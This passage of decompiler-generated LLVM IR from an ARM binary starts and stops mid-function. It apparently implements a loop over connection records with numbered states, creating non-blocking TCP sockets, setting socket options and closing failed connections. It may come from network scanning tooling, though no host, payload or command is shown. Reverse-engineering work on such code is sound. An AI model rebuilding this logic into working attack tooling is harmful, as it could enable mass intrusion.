  %v3_90d8 = inttoptr i32 %v2_90d8 to i32*
  store i32 %v3_90c8, i32* %v3_90d8, align 4
  %v0_90dc = load i32, i32* %lr.global-to-local, align 4
  %v2_90e0 = inttoptr i32 %v1_90cc to i8*
  %v3_90e0 = call i32 @function_12d5c(i8* %v2_90e0, i32 %v0_90d4)
  store i32 %v3_90e0, i32* %r0.global-to-local, align 4
  %v0_90e4 = load i32, i32* @r5, align 4
  %v1_90e4 = add i32 %v0_90e4, 532
  %v2_90e4 = inttoptr i32 %v1_90e4 to i8*
  %v3_90e4 = load i8, i8* %v2_90e4, align 1
  %v4_90e4 = zext i8 %v3_90e4 to i32
  store i32 %v4_90e4, i32* %r3.global-to-local, align 4
  %v2_90e8 = icmp ugt i8 %v3_90e4, 46
  store i1 %v2_90e8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_90e8 = icmp ult i8 %v3_90e4, 47
  store i1 %v6_90e8, i1* %cpsr_n.global-to-local, align 1
  %v7_90e8 = icmp eq i8 %v3_90e4, 47
  store i1 %v7_90e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e8, label %dec_label_pc_9114, label %dec_label_pc_90f0

dec_label_pc_90f0:                                ; preds = %dec_label_pc_909c
  store i32 %v0_90dc, i32* %r0.global-to-local, align 4
  %v1_90f4 = inttoptr i32 %v0_90dc to i8*
  %v2_90f4 = call i32 @function_12d34(i8* %v1_90f4)
  store i32 %v2_90f4, i32* %r2.global-to-local, align 4
  %v0_90fc = load i32, i32* @r5, align 4
  %v1_9100 = add i32 %v0_90fc, 533
  store i32 %v1_9100, i32* %r0.global-to-local, align 4
  store i32 %v0_90dc, i32* %r1.global-to-local, align 4
  %v3_9108 = inttoptr i32 %v1_9100 to i32*
  %v4_9108 = inttoptr i32 %v0_90dc to i32*
  %v5_9108 = call i32* @memmove(i32* %v3_9108, i32* %v4_9108, i32 %v2_90f4)
  %v7_9108 = ptrtoint i32* %v5_9108 to i32
  store i32 %v7_9108, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_9110 = load i32, i32* @r5, align 4
  %v3_9110 = add i32 %v2_9110, 532
  %v4_9110 = inttoptr i32 %v3_9110 to i8*
  store i8 47, i8* %v4_9110, align 1
  %v0_9118.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9114

dec_label_pc_9114:                                ; preds = %dec_label_pc_909c, %dec_label_pc_90f0
  %v0_9118 = phi i32 [ %v0_90e4, %dec_label_pc_909c ], [ %v0_9118.pre, %dec_label_pc_90f0 ]
  %v0_9114 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  %v1_9118 = add i32 %v0_9118, 1440
  store i32 %v1_9118, i32* @r0, align 4
  %v2_911c = inttoptr i32 %v1_9118 to i8*
  %v3_911c = call i32 @function_12d5c(i8* %v2_911c, i32 %v0_9114)
  %v0_9120 = load i32, i32* @r5, align 4
  %v0_9124 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9124, i32* %r1.global-to-local, align 4
  %v1_9128 = add i32 %v0_9120, 1431
  store i32 %v1_9128, i32* @r0, align 4
  %v2_912c = inttoptr i32 %v1_9128 to i8*
  %v3_912c = call i32 @function_12d5c(i8* %v2_912c, i32 %v0_9124)
  %v0_9130 = load i32, i32* @r5, align 4
  %v1_9134 = add i32 %v0_9130, 789
  store i32 %v1_9134, i32* @r0, align 4
  %v0_9138 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v2_913c = inttoptr i32 %v1_9134 to i8*
  %v3_913c = call i32 @function_12d5c(i8* %v2_913c, i32 %v0_9138)
  store i32 %v3_913c, i32* %r0.global-to-local, align 4
  %v0_9140 = load i32, i32* @r6, align 4
  %v1_9140 = add i32 %v0_9140, 20
  %v2_9140 = inttoptr i32 %v1_9140 to i8*
  %v3_9140 = load i8, i8* %v2_9140, align 1
  %v4_9140 = zext i8 %v3_9140 to i32
  store i32 %v4_9140, i32* %r3.global-to-local, align 4
  %v2_9144 = icmp ugt i8 %v3_9140, 30
  store i1 %v2_9144, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9144 = icmp ult i8 %v3_9140, 31
  store i1 %v6_9144, i1* %cpsr_n.global-to-local, align 1
  %v7_9144 = icmp eq i8 %v3_9140, 31
  store i1 %v7_9144, i1* %cpsr_z.global-to-local, align 1
  %v2_9148 = xor i1 %v7_9144, true
  %v3_9148 = and i1 %v2_9144, %v2_9148
  br i1 %v3_9148, label %dec_label_pc_ab40, label %dec_label_pc_914c

dec_label_pc_914c:                                ; preds = %dec_label_pc_9114
  %v1_914c = add i32 %v0_9140, 16
  %v2_914c = inttoptr i32 %v1_914c to i32*
  %v3_914c = load i32, i32* %v2_914c, align 4
  store i32 %v3_914c, i32* @r4, align 4
  %v0_9150 = call i32 @function_105b0()
  store i32 %v0_9150, i32* %r0.global-to-local, align 4
  %v0_9154 = load i32, i32* @r4, align 4
  %v1_9158 = and i32 %v0_9154, 65280
  store i32 %v1_9158, i32* %r3.global-to-local, align 4
  %v1_9154 = udiv i32 %v0_9154, 256
  %v3_915c = and i32 %v1_9154, 65280
  store i32 %v3_915c, i32* %r2.global-to-local, align 4
  %v3_9160 = mul i32 %v0_9154, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9164 = mul nuw nsw i32 %v1_9158, 256
  %v5_9164 = or i32 %v4_9164, %v3_9160
  store i32 %v5_9164, i32* %r1.global-to-local, align 4
  %v0_9168 = load i32, i32* @r6, align 4
  %v1_9168 = add i32 %v0_9168, 20
  %v2_9168 = inttoptr i32 %v1_9168 to i8*
  %v3_9168 = load i8, i8* %v2_9168, align 1
  %v4_9168 = zext i8 %v3_9168 to i32
  store i32 %v4_9168, i32* %ip.global-to-local, align 4
  %v2_9170 = call i32 @llvm.bswap.i32(i32 %v0_9154)
  %v7_9174 = lshr i32 %v0_9150, %v4_9168
  %v8_9174 = add i32 %v7_9174, %v2_9170
  store i32 %v8_9174, i32* %r2.global-to-local, align 4
  %v3_9180 = mul i32 %v8_9174, 16777216
  %v1_9184 = and i32 %v8_9174, 65280
  store i32 %v1_9184, i32* %r0.global-to-local, align 4
  %v4_9188 = mul nuw nsw i32 %v1_9184, 256
  %v5_9188 = or i32 %v4_9188, %v3_9180
  store i32 %v5_9188, i32* %r1.global-to-local, align 4
  %v2_918c = and i32 %v8_9174, 8388608
  %v3_918c = icmp ne i32 %v2_918c, 0
  store i1 %v3_918c, i1* %cpsr_c.global-to-local, align 1
  %v2_9190 = call i32 @llvm.bswap.i32(i32 %v8_9174)
  store i32 %v2_9190, i32* %r3.global-to-local, align 4
  %v1_9194 = load i32, i32* @r5, align 4
  %v2_9194 = add i32 %v1_9194, 16
  %v3_9194 = inttoptr i32 %v2_9194 to i32*
  store i32 %v2_9190, i32* %v3_9194, align 4
  br label %dec_label_pc_ab40

dec_label_pc_91c4:                                ; preds = %thread-pre-split
  %v1_91c8 = add i32 %v3_9080, 1456
  %v0_91d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_91d0 = urem i32 %v0_91d0, 256
  store i32 %v1_91d0, i32* %r3.global-to-local, align 4
  %v1_91d4 = add i32 %v3_9080, 1464
  store i32 %v1_91d4, i32* %r1.global-to-local, align 4
  %v2_91d8 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_91d8, i32* %r2.global-to-local, align 4
  store i32 %v1_91c8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_91f8.preheader

dec_label_pc_91f8.preheader:                      ; preds = %dec_label_pc_91c4, %dec_label_pc_ab64
  %storemerge149.in.in = phi i32 [ %v0_ab78, %dec_label_pc_ab64 ], [ %v0_91d0, %dec_label_pc_91c4 ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_ab70, %dec_label_pc_ab64 ], [ %v1_91c8, %dec_label_pc_91c4 ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_ab78, %dec_label_pc_ab64 ], [ %v1_91d0, %dec_label_pc_91c4 ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_ab7c, %dec_label_pc_ab64 ], [ %v1_91d4, %dec_label_pc_91c4 ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_ab80, %dec_label_pc_ab64 ], [ %v2_91d8, %dec_label_pc_91c4 ]
  %storemerge149.in = and i32 %storemerge149.in.in, 128
  %storemerge149 = icmp ne i32 %storemerge149.in, 0
  store i1 %storemerge149, i1* %cpsr_c.global-to-local, align 1
  %v3_ab88 = udiv i32 %storemerge149.in.in, 256
  store i32 %v3_ab88, i32* %r8.global-to-local, align 4
  %v4_9260 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_93a0 = ptrtoint i32* %stack_var_-148 to i32
  %v2_93b8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_93f8 = ptrtoint i32* %stack_var_-72 to i32
  %tmp209 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v2_9418 = ptrtoint i32* %stack_var_-36 to i32
  %v1_9610 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_9964 = icmp slt i32 %v6_8ed0, 0
  %v2_9964 = icmp eq i32 %v6_8ed0, 0
  %v4_99b8 = inttoptr i32 %stack_var_-20856.0.ph to i32*
  %v1_9860 = inttoptr i32 %v6_8ed0 to i8*
  %v2_9484 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9488 = ptrtoint i32* %stack_var_-200 to i32
  %tmp210 = bitcast i32* %stack_var_-200 to %_TYPEDEF_fd_set*
  %v2_948c = ptrtoint i32* %stack_var_-328 to i32
  %tmp211 = bitcast i32* %stack_var_-328 to %_TYPEDEF_fd_set*
  %tmp212 = bitcast i32* %stack_var_-56 to %timeval*
  %v2_9eec = add i32 %v2_9418, -20773
  %v2_9578 = ptrtoint i32* %stack_var_-44 to i32
  %v2_9584 = ptrtoint i32* %stack_var_-48 to i32
  %v5_9260 = or i32 %v4_9260, %v3_ab88
  %v1_9264 = and i32 %v3_ab88, 128
  %v2_9264 = icmp ne i32 %v1_9264, 0
  %v3_9264254 = udiv i32 %v5_9260, 256
  %v1_926c = add i32 %stack_var_-20872.0.ph, -1464
  %v1_9274 = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_9264254, 16777216
  %v4_93e0 = sdiv i32 %sext, 16777216
  %sext11 = mul i32 %v3_ab88, 16777216
  %v4_93e8 = sdiv i32 %sext11, 16777216
  %v2_92ac = add i32 %v2_93a0, 112
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9464, %dec_label_pc_9244, %dec_label_pc_945c, %dec_label_pc_9508, %dec_label_pc_91f8.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_91fc = call i32 @time(i32* null)
  store i32 %v2_91fc, i32* %r0.global-to-local, align 4
  store i32 %v2_91fc, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_921c262 = load i32, i32* @sp, align 4
  %v3_921c263 = add i32 %v2_921c262, 20684
  %v4_921c264 = inttoptr i32 %v3_921c263 to i32*
  store i32 0, i32* %v4_921c264, align 4
  br label %dec_label_pc_920c.dec_label_pc_920c_crit_edge

dec_label_pc_920c.dec_label_pc_920c_crit_edge:    ; preds = %dec_label_pc_91f8, %dec_label_pc_920c.dec_label_pc_920c_crit_edge
  %v0_920c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_921c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_9210 = add i32 %v0_920c.pre, 4
  store i32 %v1_9210, i32* %r3.global-to-local, align 4
  %v1_9214 = add i32 %v0_920c.pre, 20684
  store i32 %v1_9214, i32* %ip.global-to-local, align 4
  %v7_9218 = icmp eq i32 %v1_9210, 128
  %v2_921c = load i32, i32* @sp, align 4
  %v3_921c = add i32 %v2_921c, %v1_9214
  %v4_921c = inttoptr i32 %v3_921c to i32*
  store i32 %v0_921c.pre, i32* %v4_921c, align 4
  br i1 %v7_9218, label %dec_label_pc_9224, label %dec_label_pc_920c.dec_label_pc_920c_crit_edge

dec_label_pc_9224:                                ; preds = %dec_label_pc_920c.dec_label_pc_920c_crit_edge
  %v1_9218 = add i32 %v0_920c.pre, -124
  %v6_9218 = icmp slt i32 %v1_9218, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_9218, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_9224 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_9224, i32* %r0.global-to-local, align 4
  %v1_9230265 = add i32 %v0_9224, 4
  store i32 %v1_9230265, i32* %r3.global-to-local, align 4
  %v1_9234266 = add i32 %v0_9224, 20556
  store i32 %v1_9234266, i32* %lr.global-to-local, align 4
  %v7_9238267 = icmp eq i32 %v1_9230265, 128
  %v2_923c268 = load i32, i32* @sp, align 4
  %v3_923c269 = add i32 %v2_923c268, %v1_9234266
  %v4_923c270 = inttoptr i32 %v3_923c269 to i32*
  store i32 %v0_9224, i32* %v4_923c270, align 4
  br i1 %v7_9238267, label %dec_label_pc_9244, label %dec_label_pc_922c.dec_label_pc_922c_crit_edge

dec_label_pc_922c.dec_label_pc_922c_crit_edge:    ; preds = %dec_label_pc_9224, %dec_label_pc_922c.dec_label_pc_922c_crit_edge
  %v0_922c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_923c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_9230 = add i32 %v0_922c.pre, 4
  store i32 %v1_9230, i32* %r3.global-to-local, align 4
  %v1_9234 = add i32 %v0_922c.pre, 20556
  store i32 %v1_9234, i32* %lr.global-to-local, align 4
  %v7_9238 = icmp eq i32 %v1_9230, 128
  %v2_923c = load i32, i32* @sp, align 4
  %v3_923c = add i32 %v2_923c, %v1_9234
  %v4_923c = inttoptr i32 %v3_923c to i32*
  store i32 %v0_923c.pre, i32* %v4_923c, align 4
  br i1 %v7_9238, label %dec_label_pc_9244, label %dec_label_pc_922c.dec_label_pc_922c_crit_edge

dec_label_pc_9244:                                ; preds = %dec_label_pc_922c.dec_label_pc_922c_crit_edge, %dec_label_pc_9224
  store i32 %v0_906c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_9088, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_9088, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp208, label %dec_label_pc_91f8, label %dec_label_pc_9250

dec_label_pc_9250:                                ; preds = %dec_label_pc_9244
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_9260, i32* %r2.global-to-local, align 4
  store i1 %v2_9264, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_9264254, i32* %lr.global-to-local, align 4
  %v0_9268 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_9268, i32* @sl, align 4
  store i32 %v1_926c, i32* @r7, align 4
  store i32 %v0_9268, i32* @r8, align 4
  store i32 %v1_9274, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_9320

dec_label_pc_9288:                                ; preds = %dec_label_pc_932c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_9288 = icmp eq i8 %v3_9320, 2
  store i1 %v7_9288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9288, label %dec_label_pc_9a38, label %dec_label_pc_9290

dec_label_pc_9290:                                ; preds = %dec_label_pc_9288
  %v2_9290 = icmp ugt i8 %v3_9320, 3
  store i1 %v2_9290, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9290 = icmp ult i8 %v3_9320, 4
  store i1 %v6_9290, i1* %cpsr_n.global-to-local, align 1
  %v7_9290 = icmp eq i8 %v3_9320, 4
  store i1 %v7_9290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9290, label %dec_label_pc_95dc, label %dec_label_pc_9298

dec_label_pc_9298:                                ; preds = %dec_label_pc_9290
  %v2_9298 = icmp ugt i8 %v3_9320, 5
  store i1 %v2_9298, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9298 = icmp ult i8 %v3_9320, 6
  store i1 %v6_9298, i1* %cpsr_n.global-to-local, align 1
  %v7_9298 = icmp eq i8 %v3_9320, 6
  store i1 %v7_9298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9298, label %.thread25, label %dec_label_pc_92b8

.thread25:                                        ; preds = %dec_label_pc_9298
  %v2_929c = add i32 %v3_95d0, -1431
  %v3_929c = inttoptr i32 %v2_929c to i32*
  %v4_929c = load i32, i32* %v3_929c, align 4
  store i32 %v4_929c, i32* %r0.global-to-local, align 4
  %v4_92a4 = udiv i32 %v4_929c, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_92a8 = mul nuw nsw i32 %v4_92a4, 4
  store i32 %v2_92ac, i32* %r1.global-to-local, align 4
  %v3_92b0 = add i32 %v4_92a8, %v2_92ac
  store i32 %v3_92b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9a18

dec_label_pc_92b8:                                ; preds = %dec_label_pc_9298
  %v2_92b8 = icmp ugt i8 %v3_9320, 6
  store i1 %v2_92b8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_92b8 = icmp ult i8 %v3_9320, 7
  store i1 %v6_92b8, i1* %cpsr_n.global-to-local, align 1
  %v7_92b8 = icmp eq i8 %v3_9320, 7
  store i1 %v7_92b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92b8, label %.thread36, label %dec_label_pc_92d8

.thread36:                                        ; preds = %dec_label_pc_92b8
  %v2_92bc = add i32 %v3_95d0, -1431
  %v3_92bc = inttoptr i32 %v2_92bc to i32*
  %v4_92bc = load i32, i32* %v3_92bc, align 4
  store i32 %v4_92bc, i32* %r0.global-to-local, align 4
  %v4_92c4 = udiv i32 %v4_92bc, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_92c8 = mul nuw nsw i32 %v4_92c4, 4
  store i32 %v2_92ac, i32* %r2.global-to-local, align 4
  %v3_92d0 = add i32 %v4_92c8, %v2_92ac
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9a18

dec_label_pc_92d8:                                ; preds = %dec_label_pc_92b8
  %v2_92d8 = icmp ugt i8 %v3_9320, 9
  store i1 %v2_92d8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_92d8 = icmp ult i8 %v3_9320, 10
  store i1 %v6_92d8, i1* %cpsr_n.global-to-local, align 1
  %v7_92d8 = icmp eq i8 %v3_9320, 10
  store i1 %v7_92d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92d8, label %dec_label_pc_9a00, label %dec_label_pc_92e0

dec_label_pc_92e0:                                ; preds = %dec_label_pc_92d8
  %v1_92e0 = add nsw i32 %v4_9320, -11
  %v2_92e0 = icmp ugt i8 %v3_9320, 10
  store i1 %v2_92e0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_92e0 = icmp ult i8 %v3_9320, 11
  store i1 %v6_92e0, i1* %cpsr_n.global-to-local, align 1
  %v7_92e0 = icmp eq i8 %v3_9320, 11
  store i1 %v7_92e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92e0, label %dec_label_pc_a574, label %dec_label_pc_92e8

dec_label_pc_92e8:                                ; preds = %dec_label_pc_9a38, %dec_label_pc_92e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_9320, align 1
  %v0_92f0 = load i32, i32* @r6, align 4
  %v1_92f0 = add i32 %v0_92f0, -1431
  %v2_92f0 = inttoptr i32 %v1_92f0 to i32*
  %v3_92f0 = load i32, i32* %v2_92f0, align 4
  store i32 %v3_92f0, i32* %r0.global-to-local, align 4
  %v1_92f4 = call i32 @close(i32 %v3_92f0)
  store i32 %v1_92f4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_92fc = load i32, i32* @r6, align 4
  %v2_92fc = add i32 %v1_92fc, -1431
  %v3_92fc = inttoptr i32 %v2_92fc to i32*
  store i32 -1, i32* %v3_92fc, align 4
  br label %dec_label_pc_9300

dec_label_pc_9300:                                ; preds = %dec_label_pc_999c, %dec_label_pc_9a18, %dec_label_pc_9420, %dec_label_pc_9334, %dec_label_pc_a574, %dec_label_pc_92e8
  store i32 %v0_906c, i32* %lr.global-to-local, align 4
  %v0_9304 = load i32, i32* @r8, align 4
  %v1_9304 = add i32 %v0_9304, 1
  store i32 %v1_9304, i32* @r8, align 4
  %v0_9308 = load i32, i32* @r7, align 4
  %v0_930c = load i32, i32* @r6, align 4
  %v2_9310 = sub i32 %v0_906c, %v1_9304
  %v3_9310 = icmp uge i32 %v0_906c, %v1_9304
  store i1 %v3_9310, i1* %cpsr_c.global-to-local, align 1
  %v4_9310 = xor i32 %v1_9304, %v0_906c
  %v5_9310 = xor i32 %v2_9310, %v0_906c
  %v6_9310 = and i32 %v5_9310, %v4_9310
  %v7_9310 = icmp slt i32 %v6_9310, 0
  store i1 %v7_9310, i1* %cpsr_v.global-to-local, align 1
  %v8_9310 = icmp slt i32 %v2_9310, 0
  store i1 %v8_9310, i1* %cpsr_n.global-to-local, align 1
  %v9_9310 = icmp eq i32 %v0_906c, %v1_9304
  store i1 %v9_9310, i1* %cpsr_z.global-to-local, align 1
  %v1_9314 = add i32 %v0_9308, 3140
  store i32 %v1_9314, i32* @r7, align 4
  %v1_9318 = add i32 %v0_930c, 3140
  store i32 %v1_9318, i32* @r6, align 4
  br i1 %v9_9310, label %dec_label_pc_9300.dec_label_pc_945c_crit_edge, label %dec_label_pc_9320

dec_label_pc_9300.dec_label_pc_945c_crit_edge:    ; preds = %dec_label_pc_9300
  %v0_945c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_945c

dec_label_pc_9320:                                ; preds = %dec_label_pc_943c, %dec_label_pc_9300, %dec_label_pc_9250
  %v3_95d0 = phi i32 [ %v1_9274, %dec_label_pc_9250 ], [ %v1_9318, %dec_label_pc_9300 ], [ %v1_9454, %dec_label_pc_943c ]
  %v1_9320 = add i32 %v3_95d0, -1427
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %r3.global-to-local, align 4
  %v2_9324 = icmp ne i8 %v3_9320, 0
  store i1 %v2_9324, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9324 = icmp eq i8 %v3_9320, 0
  store i1 %v6_9324, i1* %cpsr_n.global-to-local, align 1
  %v7_9324 = icmp eq i8 %v3_9320, 1
  store i1 %v7_9324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9324, label %dec_label_pc_95c4, label %dec_label_pc_932c

dec_label_pc_932c:                                ; preds = %dec_label_pc_9320
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_9324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_9324, label %dec_label_pc_9334, label %dec_label_pc_9288

dec_label_pc_9334:                                ; preds = %.thread44.dec_label_pc_9334_crit_edge, %dec_label_pc_932c
  %v0_9334 = phi i32 [ %v0_9334.pre, %.thread44.dec_label_pc_9334_crit_edge ], [ %v3_95d0, %dec_label_pc_932c ]
  %v1_9334 = add i32 %v0_9334, -1431
  %v2_9334 = inttoptr i32 %v1_9334 to i32*
  %v3_9334 = load i32, i32* %v2_9334, align 4
  store i32 %v3_9334, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v1_9340 = add i32 %v3_9334, 1
  %v2_9340 = icmp eq i32 %v3_9334, -1
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  %v3_9340 = sub i32 0, %v3_9334
  %v4_9340 = and i32 %v1_9340, %v3_9340
  %v5_9340 = icmp slt i32 %v4_9340, 0
  store i1 %v5_9340, i1* %cpsr_v.global-to-local, align 1
  %v6_9340 = icmp slt i32 %v1_9340, 0
  store i1 %v6_9340, i1* %cpsr_n.global-to-local, align 1
  %v7_9340 = icmp eq i32 %v1_9340, 0
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  store i32 37720, i32* %lr.global-to-local, align 4
  %v1_9354 = xor i1 %v7_9340, true
  call void @__pseudo_cond_branch(i1 %v1_9354, i32 ptrtoint (i32* @global_var_8d50.77 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_9360 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_9360, i32* %r2.global-to-local, align 4
  %v3_9364 = call i32 @socket(i32 2, i32 1, i32 %v0_9360)
  store i32 %v3_9364, i32* %r0.global-to-local, align 4
  %v1_9368 = add i32 %v3_9364, 1
  %v2_9368 = icmp eq i32 %v3_9364, -1
  store i1 %v2_9368, i1* %cpsr_c.global-to-local, align 1
  %v3_9368 = sub i32 0, %v3_9364
  %v4_9368 = and i32 %v1_9368, %v3_9368
  %v5_9368 = icmp slt i32 %v4_9368, 0
  store i1 %v5_9368, i1* %cpsr_v.global-to-local, align 1
  %v6_9368 = icmp slt i32 %v1_9368, 0
  store i1 %v6_9368, i1* %cpsr_n.global-to-local, align 1
  %v7_9368 = icmp eq i32 %v1_9368, 0
  store i1 %v7_9368, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9364, i32* @r4, align 4
  %v1_9370 = load i32, i32* @r6, align 4
  %v2_9370 = add i32 %v1_9370, -1431
  %v3_9370 = inttoptr i32 %v2_9370 to i32*
  store i32 %v3_9364, i32* %v3_9370, align 4
  br i1 %v7_9368, label %dec_label_pc_9300, label %dec_label_pc_9378

dec_label_pc_9378:                                ; preds = %dec_label_pc_9334
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_937c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_937c, i32* %r2.global-to-local, align 4
  %v0_9380 = load i32, i32* %r0.global-to-local, align 4
  %v2_9380 = call i32 (i32, i32, ...) @fcntl(i32 %v0_9380, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9388 = or i32 %v2_9380, 2048
  store i32 %v1_9388, i32* %r2.global-to-local, align 4
  %v0_938c = load i32, i32* @r4, align 4
  store i32 %v0_938c, i32* %r0.global-to-local, align 4
  %v2_9390 = call i32 (i32, i32, ...) @fcntl(i32 %v0_938c, i32 4)
  store i32 %v2_9390, i32* %r0.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %ip.global-to-local, align 4
  store i32 %v2_93a0, i32* %r3.global-to-local, align 4
  %v0_93a4 = load i32, i32* @r6, align 4
  %v1_93a4 = add i32 %v0_93a4, -1431
  %v2_93a4 = inttoptr i32 %v1_93a4 to i32*
  %v3_93a4 = load i32, i32* %v2_93a4, align 4
  store i32 %v3_93a4, i32* %r0.global-to-local, align 4
  %v0_93a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_93a8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_93b8, i32* %r3.global-to-local, align 4
  %v7_93c0 = call i32 @setsockopt(i32 %v3_93a4, i32 %v0_93a8, i32 8, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_93c0, i32* %r0.global-to-local, align 4
  %v0_93c4 = load i32, i32* @r6, align 4
  %v1_93c4 = add i32 %v0_93c4, -1415
  %v2_93c4 = inttoptr i32 %v1_93c4 to i32*
  %v3_93c4 = load i32, i32* %v2_93c4, align 4
  store i32 %v3_93c4, i32* %ip.global-to-local, align 4
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_93d4 = add i32 %v0_93c4, -1431
  %v2_93d4 = inttoptr i32 %v1_93d4 to i32*
  %v3_93d4 = load i32, i32* %v2_93d4, align 4
  store i32 %v3_93d4, i32* %r0.global-to-local, align 4
  %v3_93dc = add i32 %v0_93c4, -1427
  %v4_93dc = inttoptr i32 %v3_93dc to i8*
  store i8 2, i8* %v4_93dc, align 1
  store i32 %v4_93e0, i32* %ip.global-to-local, align 4
  %v0_93e4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_93e4, i32* %stack_var_-72, align 4
  store i32 %v4_93e8, i32* %r3.global-to-local, align 4
  store i32 %v2_93f8, i32* %r1.global-to-local, align 4
